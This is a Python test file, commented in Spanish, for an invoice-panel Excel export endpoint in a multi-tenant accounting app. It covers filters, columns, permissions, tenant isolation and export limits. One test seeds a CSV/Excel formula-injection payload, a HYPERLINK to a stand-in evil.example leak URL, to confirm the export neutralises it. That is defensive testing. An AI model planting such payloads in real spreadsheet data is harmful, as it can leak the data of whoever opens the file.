"""Tests de comportamiento S3.2: export a Excel del panel de facturas (spec docs/specs/S3.2).

Criterios C1-C9 (backend). Observable vía HTTP (cliente ASGI con `Host` de tenant), autenticado
como `tenant_admin`, contra Postgres real. Fase roja: el endpoint
`GET /reporting/invoices/export` aún no existe.
"""

from __future__ import annotations

import io

import httpx
import openpyxl
import structlog.testing

from tests._dbtest import seed_company, seed_tenant, seed_user
from tests._invoicing import auth, seed_invoice
from tests._reporting import seed_admin_with_company as _admin

Api = tuple[httpx.AsyncClient, dict[str, str]]

EXPORT_URL = "/api/v1/reporting/invoices/export"


def _read_rows(content: bytes) -> list[tuple]:
    """Lee el Excel devuelto y da sus filas (sin la cabecera) como tuplas."""
    workbook = openpyxl.load_workbook(io.BytesIO(content))
    sheet = workbook.active
    rows = list(sheet.iter_rows(values_only=True))
    return rows[1:]  # sin cabecera


async def test_c1_exportar_sin_filtros_trae_todas_las_facturas_de_la_asesoria(
    authapi: Api,
) -> None:
    """C1: el Excel tiene cabecera + una fila por factura de todas las empresas de la asesoría."""
    client, dsns = authapi
    tenant_id, admin_id, company_1, token = await _admin(dsns, client)
    company_2 = await seed_company(dsns["admin"], tenant_id=tenant_id, name="E2", cif="B06183446")
    await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_1)
    await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_2)

    resp = await client.get(EXPORT_URL, headers=auth(token, "ilex.localhost"))

    assert resp.status_code == 200, resp.text
    assert "spreadsheet" in resp.headers["content-type"]
    assert "attachment" in resp.headers["content-disposition"]
    rows = _read_rows(resp.content)
    assert len(rows) == 2


async def test_c2_el_export_respeta_los_filtros_de_fecha(authapi: Api) -> None:
    """C2: el export solo trae las facturas cuyo issue_date cae dentro del rango."""
    client, dsns = authapi
    tenant_id, admin_id, company_id, token = await _admin(dsns, client)
    await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_id, issue_date="2026-06-15")
    await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_id, issue_date="2026-01-01")

    resp = await client.get(
        EXPORT_URL,
        params={"date_from": "2026-06-01", "date_to": "2026-06-30"},
        headers=auth(token, "ilex.localhost"),
    )

    assert resp.status_code == 200, resp.text
    rows = _read_rows(resp.content)
    assert len(rows) == 1


async def test_c3_el_export_no_pagina_trae_mas_de_una_pagina_del_panel(authapi: Api) -> None:
    """C3: con más de PAGE_SIZE (50) facturas, el export las trae TODAS, no solo 50."""
    client, dsns = authapi
    tenant_id, admin_id, company_id, token = await _admin(dsns, client)
    for _ in range(55):
        await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_id)

    resp = await client.get(EXPORT_URL, headers=auth(token, "ilex.localhost"))

    assert resp.status_code == 200, resp.text
    rows = _read_rows(resp.content)
    assert len(rows) == 55


async def test_c4_las_columnas_y_su_contenido_son_correctos(authapi: Api) -> None:
    """C4: la fila trae Empresa, Fecha, Proveedor, CIF, Base, IVA, Total, IRPF, Tramos IVA,
    Confirmado por y la alerta de CIF propio, en ese orden. "Estado CIF"/"Fecha de subida" se
    quitaron del export a petición de Julio (2026-08-01) — el dato sigue existiendo en BD, solo deja
    de mostrarse aquí."""
    client, dsns = authapi
    tenant_id, admin_id, company_id, token = await _admin(dsns, client)
    await seed_invoice(
        dsns,
        tenant_id=tenant_id,
        company_id=company_id,
        confirmed_by=admin_id,
        counterparty_name="Proveedor SA",
        counterparty_tax_id="A39031620",
        counterparty_cif_status="valid",
        net_amount="100.00",
        tax_amount="21.00",
        total_amount="121.00",
        irpf_amount="15.00",
        issue_date="2026-06-15",
        tax_lines=[{"iva_pct": "21", "base": "100.00", "cuota": "21.00"}],
    )

    resp = await client.get(EXPORT_URL, headers=auth(token, "ilex.localhost"))

    assert resp.status_code == 200, resp.text
    workbook = openpyxl.load_workbook(io.BytesIO(resp.content))
    sheet = workbook.active
    header = next(sheet.iter_rows(values_only=True))
    assert header == (
        "Empresa",
        "Fecha",
        "Proveedor",
        "CIF proveedor",
        "Base",
        "IVA",
        "Total",
        "IRPF",
        "Tramos IVA",
        "Confirmado por",
        "Revisar CIF propio",
    )
    row = _read_rows(resp.content)[0]
    assert row[0] == "Empresa"  # nombre de la empresa sembrada por _admin en test_reporting_panel
    assert str(row[2]) == "Proveedor SA"
    assert str(row[3]) == "A39031620"
    # Importes con coma decimal (2026-08-01, pregunta de Julio): texto, no numérico, precisamente
    # para que se vea igual sin importar el idioma del Excel que lo abra.
    assert row[4] == "100,00"
    assert row[5] == "21,00"
    assert row[6] == "121,00"
    assert row[7] == "15,00"
    assert row[8] == "21% (100,00 → 21,00)"
    assert row[9] == "admin@ilex.es"
    assert row[10] is None  # openpyxl reabre una celda vacía como None.


async def test_c4b_nombre_de_proveedor_con_formula_no_se_ejecuta_como_formula(
    authapi: Api,
) -> None:
    """Caso límite de seguridad: un proveedor con "=..." en el nombre (dato de un tercero, viene
    del OCR) no debe quedar como fórmula ejecutable al abrir el Excel (inyección de fórmula)."""
    client, dsns = authapi
    tenant_id, admin_id, company_id, token = await _admin(dsns, client)
    await seed_invoice(
        dsns,
        tenant_id=tenant_id,
        company_id=company_id,
        counterparty_name='=HYPERLINK("http://evil.example/leak","ver")',
    )

    resp = await client.get(EXPORT_URL, headers=auth(token, "ilex.localhost"))

    assert resp.status_code == 200, resp.text
    row = _read_rows(resp.content)[0]
    # openpyxl solo evalúa como fórmula real un `value` que EMPIEZA por "=": el apóstrofo antepuesto
    # fuerza que se lea como texto literal (no como fórmula) al abrir el fichero.
    assert str(row[2]).startswith("'=")


async def test_c5_solo_tenant_admin_exporta(authapi: Api) -> None:
    """C5: un empleado (`user`) no exporta -> 403."""
    from tests._auth import USER_PASSWORD, USER_PASSWORD_HASH, login  # noqa: PLC0415

    client, dsns = authapi
    tenant_id, admin_id, company_id, _admin_token = await _admin(dsns, client)
    await seed_user(
        dsns["admin"],
        tenant_id=tenant_id,
        email="empleado-export@ilex.es",
        role="user",
        password_hash=USER_PASSWORD_HASH,
    )
    login_resp = await login(client, "ilex.localhost", "empleado-export@ilex.es", USER_PASSWORD)
    assert login_resp.status_code == 200, login_resp.text
    empleado_token = login_resp.json()["access_token"]

    resp = await client.get(EXPORT_URL, headers=auth(empleado_token, "ilex.localhost"))

    assert resp.status_code == 403, resp.text


async def test_c6_sin_autenticar_no_hay_export(authapi: Api) -> None:
    """C6: sin token válido -> 401."""
    client, dsns = authapi
    await _admin(dsns, client)

    resp = await client.get(EXPORT_URL, headers={"Host": "ilex.localhost"})

    assert resp.status_code == 401, resp.text


async def test_c7_anti_cruce_el_export_nunca_trae_facturas_de_otra_asesoria(
    authapi: Api,
) -> None:
    """C7: el export de una asesoría nunca trae facturas de otra."""
    client, dsns = authapi
    tenant_id, admin_id, company_id, token = await _admin(dsns, client, slug="ilex")
    tid_otra = await seed_tenant(dsns["admin"], "otra-export", "Otra Export")
    comp_otra = await seed_company(dsns["admin"], tenant_id=tid_otra, name="EO", cif="B06183446")
    await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_id)
    await seed_invoice(dsns, tenant_id=tid_otra, company_id=comp_otra)

    resp = await client.get(EXPORT_URL, headers=auth(token, "ilex.localhost"))

    assert resp.status_code == 200, resp.text
    rows = _read_rows(resp.content)
    assert len(rows) == 1


async def test_c8_facturas_de_prueba_excluidas_del_export(authapi: Api) -> None:
    """C8: `is_test = true` nunca aparece en el export."""
    client, dsns = authapi
    tenant_id, admin_id, company_id, token = await _admin(dsns, client)
    await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_id, is_test=False)
    await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_id, is_test=True)

    resp = await client.get(EXPORT_URL, headers=auth(token, "ilex.localhost"))

    assert resp.status_code == 200, resp.text
    rows = _read_rows(resp.content)
    assert len(rows) == 1


async def test_c9_rango_de_fechas_invertido_da_422(authapi: Api) -> None:
    """C9: date_from posterior a date_to -> 422, no un Excel vacío ni a medias."""
    client, dsns = authapi
    _tenant_id, _admin_id, _company_id, token = await _admin(dsns, client)

    resp = await client.get(
        EXPORT_URL,
        params={"date_from": "2026-06-30", "date_to": "2026-06-01"},
        headers=auth(token, "ilex.localhost"),
    )

    assert resp.status_code == 422, resp.text


async def test_c1b_sin_resultados_da_excel_solo_con_cabecera(authapi: Api) -> None:
    """Caso límite (spec §5): filtros que no casan nada -> 200 con Excel de solo cabecera."""
    client, dsns = authapi
    _tenant_id, _admin_id, _company_id, token = await _admin(dsns, client)

    resp = await client.get(
        EXPORT_URL,
        params={"counterparty_tax_id": "A00000000"},
        headers=auth(token, "ilex.localhost"),
    )

    assert resp.status_code == 200, resp.text
    assert _read_rows(resp.content) == []


async def test_c1c_al_alcanzar_la_cota_defensiva_se_registra_sin_truncar_en_silencio(
    authapi: Api, monkeypatch
) -> None:
    """Caso límite (spec §5): al llegar a EXPORT_LIMIT, se registra (no se oculta el corte).

    `EXPORT_LIMIT` se rebaja a 2 (en vez de sembrar 5000 facturas) para probar el mismo
    comportamiento sin una siembra desproporcionada; el resto de tests fija el 5000 real.
    """
    import reporting.repository as reporting_repo  # noqa: PLC0415

    monkeypatch.setattr(reporting_repo, "EXPORT_LIMIT", 2)
    client, dsns = authapi
    tenant_id, admin_id, company_id, token = await _admin(dsns, client)
    for _ in range(3):
        await seed_invoice(dsns, tenant_id=tenant_id, company_id=company_id)

    with structlog.testing.capture_logs() as logs:
        resp = await client.get(EXPORT_URL, headers=auth(token, "ilex.localhost"))

    assert resp.status_code == 200, resp.text
    assert len(_read_rows(resp.content)) == 2  # cortado por la cota, no las 3 sembradas
    assert any(log.get("event") == "reporting.export.limit_reached" for log in logs)
